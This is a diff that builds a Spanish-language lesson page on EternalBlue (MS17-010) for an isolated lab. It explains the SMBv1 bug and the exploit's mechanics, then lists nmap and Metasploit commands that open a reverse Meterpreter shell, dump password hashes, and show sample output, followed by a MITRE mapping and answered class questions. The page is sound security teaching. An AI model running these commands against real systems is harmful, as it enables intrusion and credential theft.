@@ -5,11 +5,346 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Clase Modelo: EternalBlue / MS17-010</title>
   <style>
-    body { font-family: sans-serif; max-width: 800px; margin: 2rem auto; padding: 0 1rem; }
+    body {
+      font-family: sans-serif;
+      max-width: 860px;
+      margin: auto;
+      padding: 0 1.5rem;
+      color: #1a1a1a;
+      line-height: 1.6;
+    }
+    header {
+      background: #1a1a2e;
+      color: white;
+      padding: 1.5rem;
+      margin: 0 -1.5rem 2rem -1.5rem;
+    }
+    header h1 {
+      margin: 0 0 0.5rem 0;
+      font-size: 1.6rem;
+      color: white;
+    }
+    .badge-15min {
+      display: inline-block;
+      background: #27ae60;
+      color: white;
+      padding: 0.3rem 0.8rem;
+      border-radius: 4px;
+      font-size: 0.9rem;
+      font-weight: bold;
+    }
+    h2 {
+      color: #c0392b;
+      border-bottom: 2px solid #c0392b;
+      padding-bottom: 0.3rem;
+    }
+    h3 {
+      color: #2c3e50;
+    }
+    .tiempo {
+      background: #f39c12;
+      color: white;
+      font-size: 0.8em;
+      padding: 0.2em 0.6em;
+      border-radius: 4px;
+      float: right;
+      margin-top: 0.3em;
+    }
+    section {
+      margin-bottom: 2.5rem;
+    }
+    pre {
+      background: #1e1e2e;
+      color: #cdd6f4;
+      padding: 1rem;
+      border-radius: 6px;
+      overflow-x: auto;
+      font-size: 0.88em;
+    }
+    code {
+      background: #f4f4f4;
+      color: #c0392b;
+      padding: 0.1em 0.4em;
+      border-radius: 3px;
+    }
+    pre code {
+      background: none;
+      color: inherit;
+      padding: 0;
+      border-radius: 0;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 1rem 0;
+    }
+    th {
+      background: #2c3e50;
+      color: white;
+      padding: 0.5rem;
+      text-align: left;
+    }
+    td {
+      border: 1px solid #ddd;
+      padding: 0.5rem;
+    }
+    tr:nth-child(even) {
+      background: #f9f9f9;
+    }
+    .pregunta {
+      background: #eaf4fb;
+      border-left: 4px solid #2980b9;
+      padding: 1rem;
+      margin: 1rem 0;
+    }
+    .pregunta strong {
+      color: #2980b9;
+    }
+    ul, ol {
+      padding-left: 1.5rem;
+    }
   </style>
 </head>
 <body>
+
+<header>
   <h1>Clase Modelo: EternalBlue / MS17-010</h1>
-  <p>Contenido de la clase en construcción.</p>
+  <span class="badge-15min">15 min total</span>
+</header>
+
+<section id="contexto">
+  <h2>Contexto de la Vulnerabilidad <span class="tiempo">~3 min</span></h2>
+
+  <p>
+    <strong>EternalBlue (CVE-2017-0143)</strong> es un exploit que aprovecha una vulnerabilidad
+    en el protocolo <strong>SMBv1</strong> de Windows. Fue desarrollado por la NSA, filtrado por
+    el grupo Shadow Brokers en 2017, y utilizado como vector de propagación en los ataques de
+    ransomware <strong>WannaCry</strong> y <strong>NotPetya</strong>.
+  </p>
+
+  <p>
+    La vulnerabilidad reside en la forma en que Windows procesa listas de atributos extendidos
+    de archivos (FEA — File Extended Attributes) enviadas a través de SMBv1. Un error aritmético
+    en la función <code>SrvOs2FeaListSizeToNt()</code> permite desbordamiento de buffer controlado
+    en el kernel, lo que lleva a ejecución de código arbitrario sin necesidad de credenciales.
+  </p>
+
+  <p>
+    El parche oficial es <strong>MS17-010</strong>, publicado por Microsoft en marzo de 2017.
+    Los sistemas sin ese parche con SMBv1 activo siguen siendo vulnerables.
+  </p>
+
+  <h3>Entorno de Laboratorio</h3>
+  <ul>
+    <li><strong>Atacante:</strong> Kali Linux — IP 10.0.2.9</li>
+    <li><strong>Víctima:</strong> Metasploitable3 (Windows Server 2008 R2) — IP 10.0.2.15</li>
+    <li><strong>Condición:</strong> SMBv1 habilitado, sin parche MS17-010 aplicado</li>
+    <li><strong>Red:</strong> VirtualBox NAT Network (aislada)</li>
+  </ul>
+</section>
+
+<section id="fases">
+  <h2>Fases del Ataque <span class="tiempo">~3 min</span></h2>
+
+  <h3>Fase 1 — Reconocimiento</h3>
+  <p>
+    Identificar que el puerto 445 (SMB) está activo y que el sistema ejecuta SMBv1 sin parche.
+    Se usa <code>nmap</code> con scripts de detección de vulnerabilidades:
+  </p>
+  <pre><code>sudo nmap --script vuln -p 445 10.0.2.15</code></pre>
+  <p>Si el sistema es vulnerable, nmap reporta el estado <code>VULNERABLE</code> con referencia a <code>CVE:CVE-2017-0143</code>.</p>
+
+  <h3>Fase 2 — Acceso Inicial</h3>
+  <p>
+    Explotación remota sin credenciales a través de SMBv1. El exploit envía paquetes
+    especialmente construidos que desbordan el kernel pool del sistema víctima, ejecutando
+    shellcode con privilegios de kernel (NT AUTHORITY\SYSTEM).
+  </p>
+
+  <h3>Mecánica de Metasploit — Cómo funciona el exploit</h3>
+
+  <p><strong>1. <code>make_kernel_user_payload</code> — El puente kernel → usuario</strong></p>
+  <p>
+    EternalBlue da ejecución de código en <strong>modo kernel</strong> (anillo 0), pero
+    Meterpreter necesita correr en <strong>modo usuario</strong> (anillo 3). La función
+    <code>make_kernel_user_payload</code> resuelve esto uniendo dos partes:
+  </p>
+  <ul>
+    <li>
+      <code>sc</code> — shellcode x64 que corre en modo kernel. Su trabajo: salvar el estado
+      del procesador, navegar la lista de procesos del kernel para encontrar
+      <code>spoolsv.exe</code> por su hash ROR13, inyectar el payload como un APC
+      (Asynchronous Procedure Call) en ese proceso, y restaurar el estado del kernel.
+    </li>
+    <li>
+      <code>ring3</code> — el payload Meterpreter generado por <code>msfvenom</code>.
+      Se concatena al final del shellcode kernel. El tamaño exacto del Meterpreter está
+      embebido dentro del shellcode del kernel para que sepa cuántos bytes copiar al
+      espacio de usuario.
+    </li>
+  </ul>
+
+  <p><strong>2. <code>smb_eternalblue</code> — Los 4 pasos del ataque</strong></p>
+  <p>El módulo ejecuta cuatro pasos en secuencia para explotar el sistema Windows 7 / Server 2008 R2:</p>
+  <ul>
+    <li><strong>Step 1:</strong> Conectar al share <code>IPC$</code> vía SMBv1 sin credenciales (login anónimo).</li>
+    <li><strong>Step 2:</strong> Enviar un paquete NT_TRANS grande con buffer SMBv1 malformado, inicializando la corrupción del pool.</li>
+    <li><strong>Step 3:</strong> <em>Pool grooming</em> — el exploit alterna abrir conexiones SMBv2 (que asignan bloques de ~64KB en el kernel pool) y cerrar conexiones SMBv1 (que liberan bloques), de modo que el buffer a corromper quede adyacente en memoria al buffer que el atacante controla. El parámetro <code>GroomAllocations</code> controla cuántas veces se repite este llenado. Sin este trabajo de ingeniería de memoria, el overflow corrompería memoria aleatoria y el sistema colapsaría (BSOD).</li>
+    <li><strong>Step 4:</strong> Enviar el payload con el shellcode.</li>
+  </ul>
+
+  <p><strong>3. <code>create_fea_list</code> — Donde vive el bug original</strong></p>
+  <p>
+    FEA (File Extended Attributes) es un concepto heredado del OS/2. Windows Server 2008
+    aún soporta estas estructuras por compatibilidad. Cuando el servidor recibe una lista FEA
+    vía SMBv1, llama a <code>SrvOs2FeaListSizeToNt()</code> para calcular cuánta memoria
+    necesita. El cálculo tiene un error aritmético: <strong>resta un valor DWORD (32 bits)
+    de una variable WORD (16 bits)</strong>. Si el resultado es negativo, el tipo WORD hace
+    <em>underflow</em> y el resultado se convierte en un número enorme positivo.
+  </p>
+  <p>
+    El efecto: el kernel cree que el buffer necesita casi 0 bytes, asigna un buffer diminuto,
+    y luego <code>memmove()</code> copia toda la lista FEA dentro de ese buffer demasiado
+    pequeño — overflow controlado. Lo que se escribe fuera del buffer es exactamente
+    <code>fake_srv_net_buf</code>, una estructura falsa que el kernel procesa como real,
+    redirigiendo la ejecución al shellcode.
+  </p>
+
+  <div class="pregunta">
+    <strong>Pregunta 1:</strong> El exploit da ejecucion en modo kernel (anillo 0), pero
+    Meterpreter necesita correr en modo usuario (anillo 3). &iquest;Que mecanismo usa
+    <code>make_kernel_user_payload</code> para cruzar esa frontera e inyectar Meterpreter
+    en un proceso de usuario?
+  </div>
+</section>
+
+<section id="lab">
+  <h2>Laboratorio <span class="tiempo">~6 min</span></h2>
+
+  <h3>Paso 0 — Inspeccionar el modulo antes de explotar</h3>
+  <p>
+    Antes de lanzar el exploit, vale la pena ver con que herramienta se trabaja.
+    El comando <code>info</code> muestra la documentacion integrada del modulo: nombre completo,
+    CVEs referenciados, plataformas soportadas, opciones configurables y descripcion tecnica del bug.
+  </p>
+  <pre><code>msfconsole -q
+use exploit/windows/smb/ms17_010_eternalblue
+info</code></pre>
+
+  <h3>Paso 1 — Confirmar la vulnerabilidad</h3>
+  <pre><code>sudo nmap --script vuln -p 445 10.0.2.15</code></pre>
+  <p>Output esperado:</p>
+  <pre><code>| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143</code></pre>
+
+  <h3>Paso 2 — Explotar con Metasploit</h3>
+  <pre><code>msfconsole -q
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.0.2.15
+set LHOST 10.0.2.9
+set payload windows/x64/meterpreter/reverse_tcp
+run</code></pre>
+  <p>Output esperado al obtener la shell:</p>
+  <pre><code>[*] Meterpreter session 1 opened (10.0.2.9:4444 -> 10.0.2.15:XXXXX)
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM</code></pre>
+  <p>
+    <strong>Nota sobre BSOD:</strong> Si el target se reinicia en vez de abrir sesion, es el
+    modo de fallo del exploit, no el exito. EternalBlue corrompe el kernel pool — si el grooming
+    no quedo perfecto, Windows colapsa con BSOD y la VM reinicia. El reboot es senal de intento
+    fallido, no del comportamiento esperado. El modulo tiene <code>MaxExploitAttempts 3</code>
+    por defecto; a veces toma 2-3 intentos hasta que el pool queda bien acomodado.
+  </p>
+
+  <h3>Paso 3 — Post-Explotacion con Meterpreter</h3>
+  <p>Con la sesion <code>NT AUTHORITY\SYSTEM</code> abierta, el atacante tiene control total del sistema.</p>
+  <pre><code>meterpreter &gt; sysinfo
+meterpreter &gt; getuid
+meterpreter &gt; hashdump</code></pre>
+  <p>Output esperado de <code>hashdump</code>:</p>
+  <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::</code></pre>
+  <p>
+    Los hashes NT obtenidos son los mismos que extrae un dump manual via VSS + samdump2, pero
+    aqui se obtienen directamente desde Meterpreter en segundos, sin necesidad de copiar archivos
+    SAM/SYSTEM manualmente. <code>hashdump</code> usa la misma tecnica internamente: lee el hive
+    SAM a traves de una copia en memoria del kernel.
+  </p>
+
+  <div class="pregunta">
+    <strong>Pregunta 2:</strong> El comando <code>getuid</code> devuelve
+    <code>NT AUTHORITY\SYSTEM</code>. &iquest;Que significa esto en terminos de privilegios
+    dentro de Windows? &iquest;Por que el exploit obtiene directamente ese nivel de acceso
+    en lugar de un usuario con privilegios restringidos?
+  </div>
+</section>
+
+<section id="mitre">
+  <h2>Mapeo MITRE ATT&amp;CK <span class="tiempo">~2 min</span></h2>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Etapa</th>
+        <th>Kill Chain</th>
+        <th>Tactica</th>
+        <th>Tecnica</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Confirmacion de vulnerabilidad SMBv1</td>
+        <td>EternalBlue</td>
+        <td>Discovery</td>
+        <td>T1046 — Network Service Discovery</td>
+      </tr>
+      <tr>
+        <td>Explotacion SMBv1 remota</td>
+        <td>EternalBlue</td>
+        <td>Lateral Movement</td>
+        <td>T1210 — Exploitation of Remote Services</td>
+      </tr>
+      <tr>
+        <td>Obtencion de shell SYSTEM</td>
+        <td>EternalBlue</td>
+        <td>Privilege Escalation</td>
+        <td>T1068 — Exploitation for Privilege Escalation</td>
+      </tr>
+    </tbody>
+  </table>
+</section>
+
+<section id="preguntas">
+  <h2>Preguntas para la Clase <span class="tiempo">~1 min</span></h2>
+
+  <p>Recapitulacion de las preguntas planteadas durante la clase:</p>
+
+  <div class="pregunta">
+    <strong>Pregunta 1 (mecanica del exploit):</strong> El exploit da ejecucion en modo kernel
+    (anillo 0), pero Meterpreter necesita correr en modo usuario (anillo 3).
+    &iquest;Que mecanismo usa <code>make_kernel_user_payload</code> para cruzar esa frontera
+    e inyectar Meterpreter en un proceso de usuario?
+    <br><br>
+    <em>Respuesta esperada: usa un APC (Asynchronous Procedure Call) para inyectar el payload
+    en spoolsv.exe, que es un proceso de modo usuario. El shellcode kernel navega la lista de
+    procesos del kernel, encuentra spoolsv.exe por su hash ROR13, y encola el APC.</em>
+  </div>
+
+  <div class="pregunta">
+    <strong>Pregunta 2 (post-explotacion):</strong> El comando <code>getuid</code> devuelve
+    <code>NT AUTHORITY\SYSTEM</code>. &iquest;Que significa esto en terminos de privilegios
+    dentro de Windows? &iquest;Por que el exploit obtiene directamente ese nivel de acceso
+    en lugar de un usuario con privilegios restringidos?
+    <br><br>
+    <em>Respuesta esperada: NT AUTHORITY\SYSTEM es la cuenta con maximos privilegios en Windows,
+    por encima de cualquier cuenta de administrador local. Se obtiene directamente porque el
+    exploit ejecuta codigo en modo kernel — el nivel mas privilegiado del sistema — y el payload
+    hereda ese contexto de seguridad al inyectarse en spoolsv.exe.</em>
+  </div>
+</section>
+
 </body>
 </html>
